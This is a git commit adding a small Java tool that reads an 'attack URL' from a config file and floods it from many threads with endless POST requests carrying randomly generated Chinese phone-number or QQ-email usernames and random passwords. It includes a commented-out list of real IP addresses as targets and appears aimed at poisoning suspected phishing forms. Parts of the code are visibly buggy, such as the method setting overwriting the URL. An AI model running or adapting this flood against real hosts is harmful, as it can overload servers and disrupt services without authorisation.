af10ca2fc625d89c554e31b3b2bc40e86f60e327
ObcbO <m17089494917@163.com>
2022-03-21 19:52:37 +0800

    first commit

---
+++ src/App.java
@@ -0,0 +1,120 @@
+import java.io.IOException;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.util.Scanner;
+
+public class App {
+    // 默认值
+    static int thnum = 1;// 线程数
+    static String method = "POST";// 请求方法
+    static String url;// 攻击网址
+    static String param;// 攻击参数
+
+    static boolean success = true;
+
+    public static void main(String[] args) {
+        try {
+            file();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        while (success) {
+        } // todo: gui
+    }
+
+    private static void file() throws IOException {
+        String str;
+        String first = null;
+        String file;
+        if (System.getProperty("file") == null || System.getProperty("file") == ""
+                || System.getProperty("file").trim() == "") {
+            file = "default.txt";
+        } else
+            file = System.getProperty("file");
+        Path path = Paths.get(file);
+        Scanner scanner = new Scanner(path);
+        System.out.println("-=-=-=-=- Start reading file");
+        while (scanner.hasNext()) {
+            if (first == null) {
+                str = scanner.next();
+                first = str;
+            } else {
+                str = scanner.next();
+                String[] value = { first, str };
+                first = null;
+                System.out.println(value[0].toString() + " " + value[1].toString());
+                manage(value);
+            }
+        }
+        scanner.close();
+        System.out.println("-=-=-=-=- File processing completed");
+        if (success) {
+            post.start(thnum, method, url, param);
+        }
+    }
+
+    private static void manage(String[] value) {
+        if (value[0] == null) {
+            success = false;
+            System.out.println("ERROR: 无效参数名" + success);
+            return;
+        }
+        if (value[1] == null && value[0] != "//") {
+            success = false;
+            System.out.println("ERROR: 无效参数值" + success);
+            return;
+        }
+        switch (value[0]) {
+            case "线程数":
+                if (value[1].matches("[0-9]*")) {
+                    thnum = Integer.parseInt(value[1]);
+                } else {
+                    success = false;
+                    System.out.println("ERROR: 线程数 你输入的值不是一个正整数");
+                }
+                break;
+            case "请求方法":
+                String temp = value[1].toUpperCase();
+                switch (temp) {
+                    case "GET":
+                    case "HEAD":
+                    case "POST":
+                    case "PUT":
+                    case "DELETE":
+                    case "CONNECT":
+                    case "OPTIONS":
+                    case "TRACE":
+                    case "PATCH":
+                        url = temp;
+                        break;
+                    default:
+                        System.out.println("ERROR: 请求方法 未知的请求方法");
+                }
+                break;
+            case "攻击网址":
+                if (value[1].matches("^(http|https)://([\\w-]+\\.)+[\\w-]+(/[\\w-./?%&=]*)?$")) {
+                    url = value[1];
+                } else {
+                    success = false;
+                    System.out.println("ERROR: 攻击网址 你输入的字符串不是一个网址");
+                }
+                break;
+            case "参数":
+                if (value[1].contains("$[account]")) {
+                    param = value[1].replace("$[account]", "\" + account + ");
+                } else {
+                    success = false;
+                    System.out.println("ERROR: 参数 参数中不存在账号");
+                }
+                if (value[1].contains("$[password]")) {
+                    param = value[1].replace("$[password]", "\" + password + ");
+                } else {
+                    success = false;
+                    System.out.println("ERROR: 参数 参数中不存在密码");
+                }
+                break;
+            default:
+                System.out.println("ERROR: 未知参数名 " + value[0]);
+        }
+    }
+}
---
+++ src/post.java
@@ -0,0 +1,135 @@
+//import java.io.BufferedReader;
+//import java.io.InputStreamReader;
+import java.io.IOException;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+
+import java.util.Random;
+
+public class post implements Runnable {
+    static String method;
+    static String url;
+    static String param;
+
+    protected static void start(int thnum, String tmethod, String turl, String tparam) {
+        method = tmethod;
+        url = turl;
+        param = tparam;
+        for (int i = 0; i < thnum; i++) {
+            new Thread(new post()).start();
+        }
+    }
+
+    public void run() {
+        Random random = new Random();
+        int max = 16;
+        int min = 8;
+
+        String str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890@";
+        String[] bfnum = {
+                "134", "135", "136", "137", "138", "139", "150", "151", "152", "157", "158", "159", "182", "183", "184", // 中国移动
+                "187", "188", "178", "147", "172", "198", // 中国移动
+                "130", "131", "132", "145", "155", "156", "166", "171", "175", "176", "185", "186", "166", // 中国联通
+                "133", "149", "153", "173", "177", "180", "181", "189", "199"// 中国电信
+        };
+        //String[] urls = {
+        //    "http://121.5.50.10/2018.php",
+        //    "http://107.148.190.251/2018.php",
+        //    "http://47.93.13.217/2018.php",
+        //    "http://121.5.50.10/2018.php",
+        //    "http://119.91.151.236/2018.php",
+        //    "http://124.223.76.146/index.php",
+        //};
+        while (true) {
+            // url
+            //String url = urls[random.nextInt(urls.length)];
+            // name
+            String rn;
+            Long brn = (long) (Math.random() * (99999999999l - 10000000)) + 1000000;
+            switch (random.nextInt(2) + 1) {
+                case 1:
+                    int length = random.nextInt(99999999 - 10000000) + 10000000;
+                    rn = bfnum[random.nextInt(bfnum.length)].toString() + length;
+                    break;
+                case 2:
+                    rn = brn.toString() + "@qq.com";
+                    break;
+                case 3:
+                default:
+                    rn = brn.toString();
+                    break;
+            }
+            // rp
+            int rp = random.nextInt(max - min) + min;
+            StringBuffer pass = new StringBuffer();
+            for (int i = 0; i < rp; i++) {
+                int randomInt = random.nextInt(str.length());
+                pass.append(str.charAt(randomInt));
+            }
+            System.out.println(rn.toString() + " " + pass.toString());
+            go(rn.toString(), pass.toString(), url);
+        }
+    }
+
+    private static void go(String name, String pass, String surl) {
+        HttpURLConnection httpURLConnection = null;
+        try {
+            URL url = new URL(surl);
+            httpURLConnection = (HttpURLConnection) url.openConnection();
+            httpURLConnection.setRequestMethod(method);
+            // 超时时间
+            httpURLConnection.setConnectTimeout(3000);
+            // 设置是否输出
+            httpURLConnection.setDoOutput(true);
+            // 设置是否读入
+            httpURLConnection.setDoInput(true);
+            // 设置是否使用缓存
+            httpURLConnection.setUseCaches(false);
+            // 设置此 HttpURLConnection 实例是否应该自动执行 HTTP 重定向
+            httpURLConnection.setInstanceFollowRedirects(false);
+            // 设置请求头
+            httpURLConnection.setRequestProperty("Connection", "Keep-Alive");
+            httpURLConnection.setRequestProperty("Content-Length", "40");
+            httpURLConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+            httpURLConnection.setRequestProperty("User-Agent",
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.46");
+            // 连接
+            httpURLConnection.connect();
+            /* 4. 处理输入输出 */
+            // 写入参数到请求中
+            String params = "username=" + name + "&pass=" + pass;
+            OutputStream out = httpURLConnection.getOutputStream();
+            out.write(params.getBytes());
+            // 简化
+            // httpURLConnection.getOutputStream().write(params.getBytes());
+            out.flush();
+            out.close();
+            // 从连接中读取响应信息
+            //String msg = "";
+            //int code = httpURLConnection.getResponseCode();
+            //if (code == 200) {
+            //    BufferedReader reader = new BufferedReader(
+            //            new InputStreamReader(httpURLConnection.getInputStream()));
+            //    String line;
+            //    while ((line = reader.readLine()) != null) {
+            //        msg += line + "\n";
+            //    }
+            //    reader.close();
+            //}
+            // 处理结果
+            // System.out.println(msg);
+        } catch (IOException e) {
+            System.out.println(surl + " 转发出错，错误信息：" + e.getLocalizedMessage() + ";" + e.getClass());
+        } finally {
+            // 5. 断开连接
+            if (null != httpURLConnection) {
+                try {
+                    httpURLConnection.disconnect();
+                } catch (Exception e) {
+                    System.out.println(surl + " httpURLConnection 流关闭异常：" + e.getLocalizedMessage());
+                }
+            }
+        }
+    }
+}
